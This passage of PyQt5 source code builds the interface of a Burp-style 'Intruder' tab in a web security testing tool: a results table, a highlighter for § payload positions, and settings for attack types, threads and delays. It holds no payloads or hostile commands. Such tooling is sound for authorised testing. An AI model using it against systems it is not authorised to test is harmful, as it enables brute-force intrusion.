    BackgroundRole / ForegroundRole set on items.
    """

    def paint(self, painter, option, index):
        painter.save()

        # ── 1. Background (custom or alternating) ─────────────────────────
        bg = index.data(Qt.BackgroundRole)
        has_custom = isinstance(bg, QBrush) and bg.color().alpha() > 0
        if has_custom:
            painter.fillRect(option.rect, bg)
        else:
            painter.fillRect(option.rect, QColor(COLOR_DARK_BG))

        # ── 2. Selection overlay on top of background ─────────────────────
        if option.state & QStyle.State_Selected:
            sel = QColor(COLOR_HOVER)
            sel.setAlpha(130 if has_custom else 200)
            painter.fillRect(option.rect, sel)

        painter.restore()

        # ── 3. Text/icon: strip State_Selected so QSS won't re-paint BG ───
        opt = QStyleOptionViewItem(option)
        opt.state = option.state & ~(QStyle.State_Selected | QStyle.State_HasFocus)
        opt.backgroundBrush = QBrush(Qt.NoBrush)
        fg = index.data(Qt.ForegroundRole)
        if isinstance(fg, QBrush) and fg.color().isValid():
            opt.palette.setColor(QPalette.Text, fg.color())
        elif option.state & QStyle.State_Selected:
            opt.palette.setColor(QPalette.Text, QColor(COLOR_TEXT_BRIGHT))
        else:
            opt.palette.setColor(QPalette.Text, QColor(COLOR_TEXT))
        super().paint(painter, opt, index)


# ─────────────────────────────────────────────────────────────────────────────
# Results Table
# ─────────────────────────────────────────────────────────────────────────────

class ResultsTable(QTableWidget):
    row_selected = pyqtSignal(dict)  # full result dict

    COLUMNS = ["#", "Payload", "Status", "Length", "Time (ms)", "Error", "Grep Match"]

    def __init__(self, parent=None):
        super().__init__(0, len(self.COLUMNS), parent)
        self.setHorizontalHeaderLabels(self.COLUMNS)
        self._results: List[Dict] = []
        self._setup()

    def _setup(self):
        hdr = self.horizontalHeader()
        hdr.setSectionResizeMode(1, QHeaderView.Stretch)
        for i in [0, 2, 3, 4, 5, 6]:
            hdr.setSectionResizeMode(i, QHeaderView.ResizeToContents)
        self.verticalHeader().setDefaultSectionSize(22)
        self.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self.setAlternatingRowColors(False)
        self.setSortingEnabled(False)  # custom sort to handle numeric columns
        hdr.setSortIndicatorShown(True)
        hdr.setSortIndicator(-1, Qt.AscendingOrder)
        hdr.sectionClicked.connect(self._sort_by_column)
        self._sort_col = -1
        self._sort_asc = True
        self.setStyleSheet(f"""
            QTableWidget {{
                background:{COLOR_BACKGROUND};color:{COLOR_TEXT};
                gridline-color:{COLOR_BORDER};
                border:none;
                font-size:12px;font-family:{FONT_FAMILY_MONO};
            }}
            QHeaderView::section {{
                background:{COLOR_ELEVATED_BG};color:{COLOR_ACCENT};
                border:none;border-right:1px solid {COLOR_BORDER};
                padding:4px 8px;font-size:12px;
                cursor:pointer;
            }}
            QHeaderView::section:hover {{
                background:{COLOR_HOVER};
            }}
        """)
        self.setItemDelegate(_RowDelegate(self))
        self.cellClicked.connect(self._on_row_clicked)
        self.selectionModel().currentRowChanged.connect(self._on_current_row_changed)
        self.setContextMenuPolicy(Qt.CustomContextMenu)
        self.customContextMenuRequested.connect(self._context_menu)

    def _insert_row(self, row_data: dict):
        """Insert a single row at the bottom of the table."""
        r = self.rowCount()
        self.insertRow(r)
        values = [
            str(row_data.get("#", r+1)),
            str(row_data.get("payload", "")),
            str(row_data.get("status", "")),
            str(row_data.get("length", "")),
            str(row_data.get("time", "")),
            str(row_data.get("error", "")),
            str(row_data.get("grep", "")),
        ]
        for col, val in enumerate(values):
            item = QTableWidgetItem(val)
            item.setData(Qt.UserRole, row_data)
            # Color status codes
            if col == 2 and val.isdigit():
                code = int(val)
                if code < 300:
                    item.setForeground(QBrush(QColor("#98c379")))
                elif code < 400:
                    item.setForeground(QBrush(QColor("#e5c07b")))
                elif code < 500:
                    item.setForeground(QBrush(QColor("#e06c75")))
                else:
                    item.setForeground(QBrush(QColor("#c678dd")))
            # Red row on error
            if col == 5 and val:
                item.setForeground(QBrush(QColor("#e06c75")))
            self.setItem(r, col, item)

    def add_result(self, row_data: dict):
        self._results.append(row_data)
        self._insert_row(row_data)
        if getattr(self, '_auto_scroll', True):
            self.scrollToBottom()

    def _repopulate(self):
        """Clear the table and re-insert all rows from self._results in current order."""
        self.setRowCount(0)
        for row_data in self._results:
            self._insert_row(row_data)

    # ── Sorting ──────────────────────────────────────────────────────────────

    # Mapping from column index to the key used in the result dict
    _COL_KEYS = ["#", "payload", "status", "length", "time", "error", "grep"]
    # Columns that should be sorted numerically
    _NUMERIC_COLS = {0, 2, 3, 4}

    def _sort_by_column(self, col: int):
        if self._sort_col == col:
            self._sort_asc = not self._sort_asc
        else:
            self._sort_col = col
            self._sort_asc = True

        order = Qt.AscendingOrder if self._sort_asc else Qt.DescendingOrder
        self.horizontalHeader().setSortIndicator(col, order)

        key_name = self._COL_KEYS[col]
        if col in self._NUMERIC_COLS:
            def sort_key(d):
                try:
                    return float(d.get(key_name) or 0)
                except (ValueError, TypeError):
                    return 0.0
        else:
            def sort_key(d):
                return str(d.get(key_name) or "").lower()

        self._results.sort(key=sort_key, reverse=not self._sort_asc)
        self._repopulate()

    def _on_row_clicked(self, row: int, col: int):
        item = self.item(row, 0)
        if item:
            data = item.data(Qt.UserRole)
            if data:
                self.row_selected.emit(data)

    def _on_current_row_changed(self, current, previous):
        row = current.row()
        if row < 0:
            return
        item = self.item(row, 0)
        if item:
            data = item.data(Qt.UserRole)
            if data:
                self.row_selected.emit(data)

    def _context_menu(self, pos):
        row = self.rowAt(pos.y())
        if row < 0:
            return
        data = self.item(row, 0).data(Qt.UserRole) if self.item(row, 0) else None
        menu = QMenu(self)
        menu.setStyleSheet(f"QMenu{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};}} QMenu::item:selected{{background:{COLOR_HOVER};}}")
        copy_payload  = menu.addAction("Copy Payload")
        copy_resp     = menu.addAction("Copy Response")
        send_repeater = menu.addAction("→ Send to Repeater")
        send_scanner  = menu.addAction("→ Send to Scanner")
        send_endpoints= menu.addAction("→ Send to Attack Surface")
        menu.addSeparator()
        highlight_r  = menu.addAction("🔴 Highlight Red")
        highlight_g  = menu.addAction("🟢 Highlight Green")
        highlight_y  = menu.addAction("🟡 Highlight Yellow")
        clear_hl     = menu.addAction("Clear Highlight")
        action = menu.exec_(self.viewport().mapToGlobal(pos))

        if not data:
            return
        if action == copy_payload:
            from PyQt5.QtWidgets import QApplication
            QApplication.clipboard().setText(data.get("payload", ""))
        elif action == copy_resp:
            from PyQt5.QtWidgets import QApplication
            QApplication.clipboard().setText(data.get("response", ""))
        elif action == send_repeater:
            self._send_to_repeater(row, data)
        elif action == send_scanner:
            self._send_to_scanner(row, data)
        elif action == send_endpoints:
            self._send_to_endpoints(row, data)
        elif action == highlight_r:
            self._highlight_row(row, "#e06c75", 40)
        elif action == highlight_g:
            self._highlight_row(row, "#98c379", 40)
        elif action == highlight_y:
            self._highlight_row(row, "#e5c07b", 40)
        elif action == clear_hl:
            self._clear_highlight(row)

    def _highlight_row(self, row, color_hex, alpha=100):
        bg = QColor(color_hex); bg.setAlpha(alpha)
        for col in range(self.columnCount()):
            item = self.item(row, col)
            if item:
                item.setBackground(QBrush(bg))

    def _clear_highlight(self, row):
        for col in range(self.columnCount()):
            item = self.item(row, col)
            if item:
                item.setBackground(QBrush(Qt.transparent))

    def _send_to_repeater(self, row: int, data: dict):
        try:
            main_win = self.window()
            if hasattr(main_win, "tab_widget"):
                for i in range(main_win.tab_widget.count()):
                    if main_win.tab_widget.tabText(i) == "Repeater":
                        repeater = main_win.tab_widget.widget(i)
                        if hasattr(repeater, "add_request"):
                            repeater.add_request(
                                data.get("request", ""),
                                tab_name=f"Intruder #{data.get('#','?')}"
                            )
                            main_win.tab_widget.setCurrentIndex(i)
                        break
        except Exception as e:
            logger.error(f"Send to repeater: {e}")

    def _send_to_scanner(self, row: int, data: dict):
        try:
            main_win = self.window()
            if not hasattr(main_win, "scanner_tab"):
                return
            # Parse method and URL from the raw request text
            req_text = data.get("request", "")
            method, url = "GET", ""
            first_line = req_text.split("\n")[0].strip() if req_text else ""
            parts = first_line.split(" ")
            if len(parts) >= 2:
                method = parts[0]
                path   = parts[1]
                # Try to reconstruct full URL from Host header
                host_match = ""
                for line in req_text.split("\n")[1:]:
                    if line.lower().startswith("host:"):
                        host_match = line.split(":", 1)[1].strip()
                        break
                scheme = "https" if ":443" in host_match or host_match.endswith(":443") else "http"
                url = f"{scheme}://{host_match}{path}" if host_match else path
            request_data = {
                "url":          url,
                "method":       method,
                "request_text": req_text,
                "response_text": data.get("response", ""),
            }
            main_win.scanner_tab.add_request_to_queue(request_data)
            for i in range(main_win.tab_widget.count()):
                if "Scanner" in main_win.tab_widget.tabText(i):
                    main_win.tab_widget.setCurrentIndex(i)
                    break
        except Exception as e:
            logger.error(f"Send to scanner: {e}")

    def _send_to_endpoints(self, row: int, data: dict):
        try:
            main_win = self.window()
            if not hasattr(main_win, 'attack_surface_tab'):
                return
            req_text = data.get("request", "")
            method, url = "GET", ""
            first_line = req_text.split("\n")[0].strip() if req_text else ""
            parts = first_line.split(" ")
            if len(parts) >= 2:
                method = parts[0]
                path   = parts[1]
                host_match = ""
                for line in req_text.split("\n")[1:]:
                    if line.lower().startswith("host:"):
                        host_match = line.split(":", 1)[1].strip()
                        break
                scheme = "https" if ":443" in host_match or host_match.endswith(":443") else "http"
                url = f"{scheme}://{host_match}{path}" if host_match else path
            finding = {
                "url":          url,
                "method":       method,
                "status":       str(data.get("status", "")),
                "request_text": req_text,
                "source":       "Intruder",
            }
            main_win.attack_surface_tab.add_from_http_history(finding)
            for i in range(main_win.tab_widget.count()):
                if "Attack Surface" in main_win.tab_widget.tabText(i):
                    main_win.tab_widget.setCurrentIndex(i)
                    break
        except Exception as e:
            logger.error(f"Send to attack surface: {e}")

    def clear_results(self):
        self.setRowCount(0)
        self._results.clear()

    def get_results(self) -> List[Dict]:
        return self._results


# ─────────────────────────────────────────────────────────────────────────────
# Positions Editor Highlighter
# ─────────────────────────────────────────────────────────────────────────────

class PositionsHighlighter(QSyntaxHighlighter):
    """
    Syntax highlighter for the Intruder Positions request editor.
    Combines HTTP syntax colouring (matching HttpSyntaxHighlighter) with
    red background highlighting for §...§ payload-position spans.

    Combined block-state encoding:
      bits[1:0]  – HTTP parse phase: 0=start, 1=headers, 2=body
      bit[2]     – 1 if currently inside a §...§ span
    """

    _HTTP_START   = 0
    _HTTP_HEADERS = 1
    _HTTP_BODY    = 2
    _IN_POS_BIT   = 4

    # Headers whose values contain key=value token streams
    _KV_HDRS = frozenset({
        'cookie', 'set-cookie', 'authorization', 'proxy-authorization',
        'www-authenticate', 'proxy-authenticate',
    })

    def __init__(self, document):
        super().__init__(document)

        # ── HTTP formats (mirrors HttpSyntaxHighlighter) ──────────────────────
        self._method_fmt = QTextCharFormat()
        self._method_fmt.setForeground(QColor("#569cd6"))   # blue – method
        self._method_fmt.setFontWeight(QFont.Bold)

        self._url_fmt = QTextCharFormat()
        self._url_fmt.setForeground(QColor("#dcdcaa"))      # yellow – path

        self._ver_fmt = QTextCharFormat()
        self._ver_fmt.setForeground(QColor("#b5cea8"))      # muted green – HTTP/1.1

        self._status_ok_fmt = QTextCharFormat()
        self._status_ok_fmt.setForeground(QColor("#4ec994"))
        self._status_ok_fmt.setFontWeight(QFont.Bold)

        self._status_err_fmt = QTextCharFormat()
        self._status_err_fmt.setForeground(QColor("#f48771"))
        self._status_err_fmt.setFontWeight(QFont.Bold)

        self._hdr_key_fmt = QTextCharFormat()
        self._hdr_key_fmt.setForeground(QColor("#9cdcfe"))  # light blue – header name
        self._hdr_key_fmt.setFontWeight(QFont.Bold)

        self._hdr_val_fmt = QTextCharFormat()
        self._hdr_val_fmt.setForeground(QColor("#ce9178"))  # orange – header value fallback

        # Sub-token key (e.g. "session" in session=abc)
        self._sub_key_fmt = QTextCharFormat()
        self._sub_key_fmt.setForeground(QColor("#9cdcfe"))  # light blue

        # Sub-token value (e.g. "abc" in session=abc)
        self._sub_val_fmt = QTextCharFormat()
        self._sub_val_fmt.setForeground(QColor("#ce9178"))  # orange

        # Separators = ; & inside header values
        self._sep_fmt = QTextCharFormat()
        self._sep_fmt.setForeground(QColor("#808080"))      # grey

        self._json_key_fmt = QTextCharFormat()
        self._json_key_fmt.setForeground(QColor("#9cdcfe"))

        self._json_val_fmt = QTextCharFormat()
        self._json_val_fmt.setForeground(QColor("#ce9178"))

        self._json_kw_fmt = QTextCharFormat()
        self._json_kw_fmt.setForeground(QColor("#569cd6"))  # true/false/null

        self._json_num_fmt = QTextCharFormat()
        self._json_num_fmt.setForeground(QColor("#b5cea8")) # numbers

        self._html_tag_fmt = QTextCharFormat()
        self._html_tag_fmt.setForeground(QColor("#569cd6"))

        self._html_attr_fmt = QTextCharFormat()
        self._html_attr_fmt.setForeground(QColor("#9cdcfe"))

        self._body_rules = [
            (re.compile(r'"[^"]*"\s*:'),                    self._json_key_fmt),
            (re.compile(r':\s*"[^"]*"'),                    self._json_val_fmt),
            (re.compile(r':\s*-?\d+(\.\d+)?'),              self._json_num_fmt),
            (re.compile(r'\b(true|false|null)\b'),           self._json_kw_fmt),
            (re.compile(r'</?[a-zA-Z][a-zA-Z0-9]*'),       self._html_tag_fmt),
            (re.compile(r'\s[a-zA-Z_][\w-]+='),            self._html_attr_fmt),
            (re.compile(r'="[^"]*"'),                       self._json_val_fmt),
        ]

        # kv token pattern for cookie/auth values
        self._kv_re = re.compile(r'([^=;&\s][^=;&]*)(?:(=)([^;&]*))?')

        # ── § position formats ────────────────────────────────────────────────
        self._marker_fmt = QTextCharFormat()
        self._marker_fmt.setForeground(QColor("#ff4444"))
        self._marker_fmt.setFontWeight(QFont.Bold)

        self._pos_fmt = QTextCharFormat()
        self._pos_fmt.setBackground(QColor("#4a1515"))
        self._pos_fmt.setForeground(QColor("#ff8888"))

    def _apply_kv(self, value_text, offset):
        """Colour key=value tokens inside a header value string."""
        pos = 0
        n = len(value_text)
        while pos < n:
            while pos < n and value_text[pos] in ' \t':
                self.setFormat(offset + pos, 1, self._sep_fmt)
                pos += 1
            m = self._kv_re.match(value_text, pos)
            if not m:
                pos += 1
                continue
            self.setFormat(offset + m.start(1), len(m.group(1)), self._sub_key_fmt)
            if m.group(2):
                self.setFormat(offset + m.start(2), 1, self._sep_fmt)
            if m.group(3):
                self.setFormat(offset + m.start(3), len(m.group(3)), self._sub_val_fmt)
            pos = m.end()
            if pos < n and value_text[pos] in ';&':
                self.setFormat(offset + pos, 1, self._sep_fmt)
                pos += 1

    def highlightBlock(self, text):
        prev    = self.previousBlockState()
        if prev == -1:
            prev = self._HTTP_START
        in_pos  = bool(prev & self._IN_POS_BIT)
        http_st = prev & ~self._IN_POS_BIT

        # ── HTTP syntax ───────────────────────────────────────────────────────
        if http_st == self._HTTP_START:
            if text.strip():
                if text.startswith('HTTP/'):
                    parts = text.split(' ', 2)
                    self.setFormat(0, len(parts[0]), self._ver_fmt)
                    if len(parts) >= 2:
                        code_off = len(parts[0]) + 1
                        try:
                            code = int(parts[1])
                            fmt = self._status_ok_fmt if 200 <= code < 400 else self._status_err_fmt
                        except ValueError:
                            fmt = self._ver_fmt
                        self.setFormat(code_off, len(parts[1]), fmt)
                        if len(parts) >= 3:
                            self.setFormat(code_off + len(parts[1]) + 1, len(parts[2]), fmt)
                else:
                    parts = text.split(' ', 2)
                    self.setFormat(0, len(parts[0]), self._method_fmt)
                    if len(parts) >= 2:
                        p_off = len(parts[0]) + 1
                        self.setFormat(p_off, len(parts[1]), self._url_fmt)
                    if len(parts) >= 3:
                        v_off = len(parts[0]) + 1 + len(parts[1]) + 1
                        self.setFormat(v_off, len(parts[2]), self._ver_fmt)
                http_st = self._HTTP_HEADERS
        elif http_st == self._HTTP_HEADERS:
            if not text.strip():
                http_st = self._HTTP_BODY
            else:
                colon = text.find(':')
                if colon != -1:
                    self.setFormat(0, colon, self._hdr_key_fmt)
                    val_off  = colon + 1
                    val_text = text[val_off:]
                    self.setFormat(val_off, len(val_text), self._hdr_val_fmt)
                    hdr_name = text[:colon].strip().lower()
                    if hdr_name in self._KV_HDRS:
                        self._apply_kv(val_text, val_off)
        elif http_st == self._HTTP_BODY:
            for pattern, fmt in self._body_rules:
                for m in pattern.finditer(text):
                    self.setFormat(m.start(), m.end() - m.start(), fmt)

        # ── § position markers (overlaid last so they always win) ─────────────
        i = 0
        while i < len(text):
            if text[i] == '§':
                self.setFormat(i, 1, self._marker_fmt)
                in_pos = not in_pos
            elif in_pos:
                self.setFormat(i, 1, self._pos_fmt)
            i += 1

        self.setCurrentBlockState(http_st | (self._IN_POS_BIT if in_pos else 0))


# ─────────────────────────────────────────────────────────────────────────────
# Main Intruder Tab
# ─────────────────────────────────────────────────────────────────────────────

class IntruderTab(QWidget):
    """Full Burp-style Intruder tab."""

    ATTACK_TYPES = {
        "Sniper":       "sniper",
        "Battering Ram":"battering_ram",
        "Pitchfork":    "pitchfork",
        "Cluster Bomb": "cluster_bomb",
    }

    def __init__(self, parent=None):
        super().__init__(parent)
        self._attack_thread: Optional[IntruderAttackThread] = None
        self._is_running    = False
        self._positions: List[Tuple[int, int]] = []
        self._payload_panels: List[PayloadConfigPanel] = []
        self._setup_ui()

    # ── UI ────────────────────────────────────────────────────────────────────

    def _setup_ui(self):
        root = QVBoxLayout(self)
        root.setContentsMargins(0, 0, 0, 0)
        root.setSpacing(0)

        # Top bar
        top_bar = QFrame()
        top_bar.setStyleSheet(f"background:{COLOR_ELEVATED_BG};border-bottom:1px solid {COLOR_BORDER};")
        top_bar.setFixedHeight(38)
        top_layout = QHBoxLayout(top_bar)
        top_layout.setContentsMargins(8, 4, 8, 4)
        icon_label = QLabel("⚔  INTRUDER")
        icon_label.setStyleSheet(f"color:{COLOR_CRITICAL};font-weight:700;font-size:13px;letter-spacing:1px;")

        self.start_btn = QPushButton("▶  Start Attack")
        self.start_btn.setFixedHeight(28)
        self.start_btn.setStyleSheet(f"""
            QPushButton {{
                background-color:{COLOR_ACCENT};
                color:#fff;font-weight:700;border-radius:5px;padding:0 18px;font-size:13px;
            }}
            QPushButton:hover{{background-color:{COLOR_SUCCESS};}}
            QPushButton:disabled{{background-color:#555;color:#888;}}
        """)
        self.start_btn.clicked.connect(self._start_attack)

        self.stop_btn = QPushButton("■  Stop")
        self.stop_btn.setFixedHeight(28)
        self.stop_btn.setEnabled(False)
        self.stop_btn.setStyleSheet(f"""
            QPushButton {{
                background:{COLOR_ELEVATED_BG};color:{COLOR_CRITICAL};border:1px solid {COLOR_BORDER};border-radius:5px;padding:0 14px;font-size:12px;
            }}
            QPushButton:hover{{background:{COLOR_HOVER};}}
            QPushButton:disabled{{color:#555;}}
        """)
        self.stop_btn.clicked.connect(self._stop_attack)

        self.clear_results_btn = QPushButton("Clear Results")
        self.clear_results_btn.setFixedHeight(28)
        self.clear_results_btn.setStyleSheet(f"background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:4px;padding:0 12px;font-size:12px;")
        self.clear_results_btn.clicked.connect(self._clear_results)

        self.auto_scroll_btn = QPushButton(" Auto-Scroll: ON")
        self.auto_scroll_btn.setFixedHeight(28)
        self.auto_scroll_btn.setCheckable(True)
        self.auto_scroll_btn.setChecked(True)
        self.auto_scroll_btn.setStyleSheet(
            f"QPushButton{{background:{COLOR_ELEVATED_BG};color:{COLOR_SUCCESS};border:1px solid {COLOR_BORDER};border-radius:4px;padding:0 12px;font-size:12px;}}"
            f"QPushButton:checked{{color:{COLOR_SUCCESS};}}"
            f"QPushButton:!checked{{color:{COLOR_TEXT_MUTED};}}"
        )
        self.auto_scroll_btn.clicked.connect(self._toggle_auto_scroll)

        top_layout.addWidget(icon_label)
        top_layout.addStretch()
        top_layout.addWidget(self.auto_scroll_btn)
        top_layout.addWidget(self.clear_results_btn)
        top_layout.addWidget(self.stop_btn)
        top_layout.addWidget(self.start_btn)

        # Main splitter
        main_splitter = QSplitter(Qt.Horizontal)

        # ── Left panel: sub-tabs (Target | Positions | Payloads | Options) ───
        self.config_tabs = QTabWidget()
        self.config_tabs.setStyleSheet(f"""
            QTabWidget::pane{{border:none;background:{COLOR_BACKGROUND};}}
            QTabBar::tab{{background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT_MUTED};padding:6px 14px;border:none;border-right:1px solid {COLOR_BORDER};font-size:12px;}}
            QTabBar::tab:selected{{color:{COLOR_ACCENT};border-top:2px solid {COLOR_ACCENT};background:{COLOR_BACKGROUND};}}
            QTabBar::tab:hover{{color:{COLOR_TEXT};}}
        """)

        # ---- Target tab ----
        target_widget = QWidget()
        tl = QVBoxLayout(target_widget)
        tl.setContentsMargins(12, 12, 12, 12)
        tl.setSpacing(8)

        host_row = QHBoxLayout()
        host_row.addWidget(QLabel("Host:"))
        self.host_input = QLineEdit()
        self.host_input.setPlaceholderText("e.g. example.com")
        self.host_input.setStyleSheet(f"background:{COLOR_DARK_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:4px;padding:4px 8px;")
        host_row.addWidget(self.host_input)
        host_row.addWidget(QLabel("Port:"))
        self.port_input = QLineEdit("443")
        self.port_input.setFixedWidth(65)
        self.port_input.setStyleSheet(f"background:{COLOR_DARK_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:4px;padding:4px 8px;")
        host_row.addWidget(self.port_input)
        self.ssl_check = QCheckBox("HTTPS")
        self.ssl_check.setChecked(True)
        self.ssl_check.setStyleSheet(f"color:{COLOR_TEXT};")
        host_row.addWidget(self.ssl_check)
        tl.addLayout(host_row)

        atk_row = QHBoxLayout()
        atk_row.addWidget(QLabel("Attack Type:"))
        self.attack_type_combo = QComboBox()
        self.attack_type_combo.addItems(list(self.ATTACK_TYPES.keys()))
        self.attack_type_combo.setStyleSheet(f"background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:4px;padding:3px 8px;")
        atk_row.addWidget(self.attack_type_combo)
        atk_row.addStretch()
        tl.addLayout(atk_row)

        # Attack type description
        self.atk_desc_label = QLabel()
        self.atk_desc_label.setWordWrap(True)
        self.atk_desc_label.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:11px;padding:4px;background:{COLOR_ELEVATED_BG};border-radius:4px;")
        self._update_attack_desc()
        self.attack_type_combo.currentTextChanged.connect(self._update_attack_desc)
        tl.addWidget(self.atk_desc_label)
        tl.addStretch()
        self.config_tabs.addTab(target_widget, "Target")

        # ---- Positions tab ----
        pos_widget = QWidget()
        pl = QVBoxLayout(pos_widget)
        pl.setContentsMargins(0, 0, 0, 0)
        pl.setSpacing(0)

        pos_toolbar = QFrame()
        pos_toolbar.setStyleSheet(f"background:{COLOR_ELEVATED_BG};border-bottom:1px solid {COLOR_BORDER};")
        pos_toolbar.setFixedHeight(34)
        pos_tb_layout = QHBoxLayout(pos_toolbar)
        pos_tb_layout.setContentsMargins(6, 4, 6, 4)
        pos_tb_layout.setSpacing(4)

        add_pos_btn = QPushButton("Add §")
        add_pos_btn.setFixedHeight(24)
        add_pos_btn.setStyleSheet(f"background:{COLOR_ELEVATED_BG};color:{COLOR_ACCENT};border:1px solid {COLOR_BORDER};border-radius:4px;padding:0 8px;font-size:12px;")
        add_pos_btn.clicked.connect(self._add_position)
        add_pos_btn.setToolTip("Wrap selected text in § markers")

        clear_pos_btn = QPushButton("Clear §")
        clear_pos_btn.setFixedHeight(24)
        clear_pos_btn.setStyleSheet(f"background:{COLOR_ELEVATED_BG};color:{COLOR_CRITICAL};border:1px solid {COLOR_BORDER};border-radius:4px;padding:0 8px;font-size:12px;")
        clear_pos_btn.clicked.connect(self._clear_positions)

        auto_pos_btn = QPushButton("Auto §")
        auto_pos_btn.setFixedHeight(24)
        auto_pos_btn.setStyleSheet(f"background:{COLOR_ELEVATED_BG};color:{COLOR_SUCCESS};border:1px solid {COLOR_BORDER};border-radius:4px;padding:0 8px;font-size:12px;")
        auto_pos_btn.clicked.connect(self._auto_positions)
        auto_pos_btn.setToolTip("Auto-detect parameter values and wrap them")

        self.pos_count_label = QLabel("0 positions")
        self.pos_count_label.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:11px;")

        pos_tb_layout.addWidget(add_pos_btn)
        pos_tb_layout.addWidget(clear_pos_btn)
        pos_tb_layout.addWidget(auto_pos_btn)
        pos_tb_layout.addStretch()
        pos_tb_layout.addWidget(self.pos_count_label)

        self.request_editor = QPlainTextEdit()
        self.request_editor.setStyleSheet(f"""
            QPlainTextEdit {{
                background:{COLOR_DARK_BG};color:{COLOR_TEXT};
                font-family:{FONT_FAMILY_MONO};
                font-size:12px;border:none;
            }}
        """)
        self.request_editor.setLineWrapMode(QPlainTextEdit.NoWrap)
        self._positions_hl = PositionsHighlighter(self.request_editor.document())
        self.request_editor.textChanged.connect(self._update_position_count)

        pos_info = QLabel("  Use § markers to define payload positions. Select text and click 'Add §', or click 'Auto §' to detect automatically.")
        pos_info.setStyleSheet(f"color:{COLOR_TEXT_MUTED};font-size:11px;padding:4px 8px;background:{COLOR_ELEVATED_BG};")
        pos_info.setWordWrap(True)

        pl.addWidget(pos_toolbar)
        pl.addWidget(self.request_editor)
        pl.addWidget(pos_info)
        self.config_tabs.addTab(pos_widget, "Positions")

        # ---- Payloads tab ----
        payload_outer = QWidget()
        po_layout = QVBoxLayout(payload_outer)
        po_layout.setContentsMargins(8, 8, 8, 8)
        po_layout.setSpacing(8)

        self.payload_set_combo = QComboBox()
        self.payload_set_combo.setStyleSheet(f"background:{COLOR_ELEVATED_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:4px;padding:3px 8px;")
        self.payload_set_combo.currentIndexChanged.connect(self._switch_payload_panel)

        po_layout.addWidget(QLabel("Payload Set:"))
        po_layout.addWidget(self.payload_set_combo)

        # Payload panels container (stacked by index)
        self.payload_stack = QTabWidget()
        self.payload_stack.tabBar().hide()
        self.payload_stack.setStyleSheet("QTabWidget::pane{border:none;}")
        po_layout.addWidget(self.payload_stack)

        # Add first payload panel
        self._add_payload_panel()

        self.config_tabs.addTab(payload_outer, "Payloads")

        # ---- Options tab ----
        opts_widget = QWidget()
        ol = QVBoxLayout(opts_widget)
        ol.setContentsMargins(12, 12, 12, 12)
        ol.setSpacing(10)

        # Threads
        thr_row = QHBoxLayout()
        thr_row.addWidget(QLabel("Concurrent Threads:"))
        self.threads_spin = QSpinBox()
        self.threads_spin.setRange(1, 50)
        self.threads_spin.setValue(5)
        self.threads_spin.setStyleSheet(f"background:{COLOR_DARK_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:4px;")
        thr_row.addWidget(self.threads_spin)
        thr_row.addStretch()
        ol.addLayout(thr_row)

        # Delay
        delay_row = QHBoxLayout()
        delay_row.addWidget(QLabel("Request Delay (ms):"))
        self.delay_spin = QSpinBox()
        self.delay_spin.setRange(0, 60000)
        self.delay_spin.setValue(0)
        self.delay_spin.setSingleStep(100)
        self.delay_spin.setStyleSheet(f"background:{COLOR_DARK_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:4px;")
        delay_row.addWidget(self.delay_spin)
        delay_row.addStretch()
        ol.addLayout(delay_row)

        # Timeout
        timeout_row = QHBoxLayout()
        timeout_row.addWidget(QLabel("Timeout (s):"))
        self.timeout_spin = QSpinBox()
        self.timeout_spin.setRange(1, 120)
        self.timeout_spin.setValue(10)
        self.timeout_spin.setStyleSheet(f"background:{COLOR_DARK_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:4px;")
        timeout_row.addWidget(self.timeout_spin)
        timeout_row.addStretch()
        ol.addLayout(timeout_row)

        # Grep extract
        grep_group = QGroupBox("Grep – Extract")
        grep_group.setStyleSheet(f"QGroupBox{{color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:4px;padding:8px;margin-top:8px;}} QGroupBox::title{{color:{COLOR_ACCENT};}}")
        grep_layout = QVBoxLayout(grep_group)
        grep_layout.addWidget(QLabel("Regex pattern to extract from response:"))
        self.grep_input = QLineEdit()
        self.grep_input.setPlaceholderText("e.g.  <title>(.+?)</title>")
        self.grep_input.setStyleSheet(f"background:{COLOR_DARK_BG};color:{COLOR_TEXT};border:1px solid {COLOR_BORDER};border-radius:4px;padding:4px 8px;")
        grep_layout.addWidget(self.grep_input)
        ol.addWidget(grep_group)

        # Redirects
        redir_row = QHBoxLayout()
        self.follow_redir = QCheckBox("Follow Redirects")
        self.follow_redir.setChecked(False)
        self.follow_redir.setStyleSheet(f"color:{COLOR_TEXT};")
        redir_row.addWidget(self.follow_redir)
        redir_row.addStretch()
        ol.addLayout(redir_row)

        # Baseline
        baseline_row = QHBoxLayout()
        self.send_baseline_check = QCheckBox("Send Baseline Request Before Attack")
        self.send_baseline_check.setChecked(True)
        self.send_baseline_check.setToolTip(
            "Sends the original request (no payload substitution) as request #0\n"
            "before the attack begins. The baseline row is shown in gold."
        )
        self.send_baseline_check.setStyleSheet(f"color:{COLOR_TEXT};")
        baseline_row.addWidget(self.send_baseline_check)
        baseline_row.addStretch()
        ol.addLayout(baseline_row)

        ol.addStretch()
        self.config_tabs.addTab(opts_widget, "Options")

        # Adjust payload panels when attack type changes
        self.attack_type_combo.currentTextChanged.connect(self._adjust_payload_panels)

        # ── Right panel: Results ───────────────────────────────────────────────
        right_panel = QFrame()
        rp_layout = QVBoxLayout(right_panel)
        rp_layout.setContentsMargins(0, 0, 0, 0)
        rp_layout.setSpacing(0)

        # Results header
        res_header = QFrame()
        res_header.setStyleSheet(f"background:{COLOR_ELEVATED_BG};border-bottom:1px solid {COLOR_BORDER};")
        res_header.setFixedHeight(34)
